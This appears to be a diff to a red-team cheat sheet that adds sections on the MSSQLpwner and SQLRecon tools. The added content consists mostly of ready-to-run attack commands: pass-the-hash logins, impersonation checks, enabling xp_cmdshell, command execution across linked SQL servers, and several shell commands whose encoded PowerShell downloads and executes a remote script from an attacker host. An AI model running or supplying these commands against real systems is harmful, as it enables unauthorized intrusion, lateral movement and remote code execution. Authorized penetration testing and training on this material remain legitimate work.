@@ -126,6 +126,9 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 	- [MSSQLand](#mssqland)
 		- [Add Custom Command](#add-custom-command)
 	- [mssqlclient-ng](#mssqlclient-ng)
+	- [MSSQLpwner](#mssqlpwner)
+	- [SQLRecon](#sqlrecon)
+		- [Links Exploitation](#links-exploitation)
 	- [MSSQL - Relaying & Impersonation](#mssql---relaying--impersonation)
 	- [PowerUPSQL](#powerupsql)
 - [Armory](#armory)
@@ -2352,6 +2355,135 @@ mssqlclient-ng 10.10.200.131 -d domain.com -u 'machine01$' -H ':ffffffffffffffff
 # Get reverse shell via linked server
 mssqlclient-ng 10.10.200.130 -u localuser -p password -l "SQL03" -a xpcmd "irm http://10.10.10.11/hav0c-ps.txt | iex"
 ```
+
+### MSSQLpwner
+
+```powershell
+# Try and check permissions as different users - PTH and creds
+mssqlpwner domain.com/domainuser:8b1B0BzGvj9J@10.10.100.15 -windows-auth interactive enumerate
+mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
+mssqlpwner domain.com/machine01\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
+
+
+# For local authentication
+mssqlpwner localuser:password@10.10.200.130 interactive enumerate
+
+
+# Run command on the link
+mssqlpwner localuser:password@10.10.200.130 -link-name SQL01 exec hostname
+mssqlpwner localuser:password@10.10.200.130 -link-name SQL02 exec hostname
+mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec hostname
+mssqlpwner dev.domain.com/machine01\$@10.10.200.131 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth -link-name SQL04 exec hostname
+
+
+# Get reverse shell
+mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
+
+
+# Use specific link
+mssqlpwner -hashes ':ffffffffffffffffffffffffffffffff' ./Administrator@10.10.200.131 -windows-auth -link-name sql03 enumerate interactive
+
+
+# Get the chain list accessible
+get-chain-list
+
+
+# Set chain to that of dba access on a linked machine
+set-chain c99e9ea1-6f06-4f85-85b0-4b65d11d4a3a
+
+
+# Run command on the selected chain
+exec "whoami /all"
+
+
+# Sliver session
+exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
+```
+
+
+### SQLRecon
+
+> I don't like using this as impersonation across links is not supported by SQLRecon
+
+```powershell
+# Enumerate spn
+sqlrecon -- /enum:sqlspns
+
+
+# Whoami
+sqlrecon -- /auth:wintoken /h:sql01 /m:whoami
+sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:whoami
+
+
+# Info of server
+sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /module:info
+
+
+# Who can we impersonate? 
+sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:impersonate
+
+
+# Impersonation - Fails
+sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:whoami /i:sa
+
+
+# Current user
+execute-assembly /home/kali/tools/bins/csharp-files/SQLRecon.exe '/a:wintoken /h:sql01 /m:query /command:"select SYSTEM_USER"'
+
+
+# Enable XpCMDShell
+sqlrecon -- /a:wintoken /h:sql01 /m:enablexp
+
+
+# Command Execution
+sqlrecon -- /a:wintoken /h:sql01 /m:xpcmd /i:sa /c:ipconfig
+
+
+# Get shell through sql01
+inline-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/SQLRecon.exe '/a:wintoken /h:sql01 /m:xpcmd /c:"powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
+
+
+# Enumerate links
+sqlrecon -- /a:wintoken /h:sql01 /m:links
+```
+
+
+#### Links Exploitation
+
+The links exploitation of SQLRecon is limited. Use MSSQLand to ease the process and to impersonate user across multiple links.
+
+```powershell
+# Links & Crawling - https://github.com/skahwah/SQLRecon/wiki/5.-Linked-Modules
+# Essentially, its just adding /l:server and then rest of the query is same as before
+# Enumerate links
+sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /m:links
+
+
+# Run SQL queries on the linked server
+sqlrecon -- '/auth:Local /u:localuser /p:password /h:sql01 /m:query /command:"SELECT srvname, srvproduct, rpcout FROM master..sysservers"'
+
+
+# Run further modules to get info/whoami/user and server name
+sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:info'
+sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:whoami'
+sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:query /c:"select @@servername"'
+sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:query /c:"select SYSTEM_USER"'
+
+
+# Check RPC enabled
+sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:checkrpc
+sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql03 /m:checkrpc
+
+
+# Enable xpcmd
+sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:enablexp
+sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql03 /m:enablexp
+
+
+# Shell for sql02
+inline-execute-assembly -t 50 /home/kali/tools/bins/csharp-files/SQLRecon.exe '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:xpcmd /c:"powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
+```
+
 
 ### MSSQL - Relaying & Impersonation
 
